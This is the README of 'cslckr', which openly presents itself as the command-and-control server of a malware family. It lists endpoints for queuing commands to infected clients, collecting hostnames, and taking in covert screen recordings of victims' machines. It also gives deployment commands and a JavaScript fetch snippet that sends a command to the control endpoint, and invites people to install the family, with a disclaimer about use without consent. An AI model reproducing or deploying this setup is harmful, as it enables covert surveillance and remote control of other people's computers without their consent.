# cslckr

cslckr is the central API for the cslckr malware family. It functions as a message handler, handling communication between cslckrwbcl and the [cslckrmngr](htttps://cslckrmngr.lrdevstudio.com) manager app.

## Primary Roles

*   **Instruction Relay:** Acts as a mailbox for commands, allowing the manager to queue actions that clients retrieve during their polling cycles.
*   **Data Aggregation:** Collects and indexes metadata from connected workstations, including hostnames and connection status.
*   **Media Storage:** Serves as the ingestion point for screen recordings sent by cslckrwbcl, handling multipart file uploads and secure storage.
*   **Session Orchestration:** Manages administrative authentication states and session TTL (Time-To-Live) tracking.
*   **State Control:** Provides automated endpoints for bulk operations, such as system-wide "success" or "failure" state triggers.

## API Specification

### Client & Manager Communication
*   `POST /messages`: Unified endpoint for data ingestion (pings, computer registration, and video uploads).
*   `GET /messages`: Queue retrieval for clients to fetch pending commands.

### Session & Security
*   `verify_creds`: Validates credentials from cslckrmngr against the password in the config.yaml of the current Linux machine.
*   `check_session`: Returns remaining session time and validity status for the cslckrmngr app.

### Media Management
*   `collect-recorded-[id]`: Retrieves specific MP4 recordings from the server storage.
*   `delete-videos`: Purges the local recording cache.

## Deployment

1. **Environment Setup:** Ensure this server is on a linux machine or a  VPS running with PM2

2. **Dependencies:**
    ```bash
    pip install -r .\requirements.txt
    ```

3. **Service Start:**
    ```bash
    source venv/bin/activate && pm2 start cslckr.py --name "cslckr (8003)" --interpreter python3 > /dev/null 2>&1
    ```

## Important notes

This server is absoluley required to be running when cslckrwbcl or cslckrmngr is running because they will send requests or fetch to this server and if the server is down, the apps will crash.

> If you plan on installing the cslckr malware family, you will have to install the both cslckr and cslckrwbcl repostries, because each one depends on another, and it will not work if any part is missing. The cslckrmngr app is not really required if you have basic JavaScript knowledge, as you literally open up the Chrome Console and directly send commands from there, for example: 

```javascript
    fetch('https://cslckrwbcl.lrdevstudio.com/messages', { // You might have to change this link to something like localhost or a VPS domain.
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
          "action": "jumpscare-YOUR-PC",
          "data": "5"
      })
    })
    .then(response => response.json())
    .then(data => console.log(data))
```

## Contributing

Contributions are welcome for educational improvements or feature enhancements.
1. Fork the repository.
2. Create a new feature branch.
3. Submit a pull request with a detailed description of changes.
4. For major changes, please open an issue first to discuss your ideas.

## License

This project is licensed under the [MIT License](https://opensource.org). You are free to use, modify, and distribute the software, provided the original copyright and permission notice are included

### Disclaimer

I will not be held responsible for any damages caused by the cslckr malware family if it is installed on computers without the user's consent.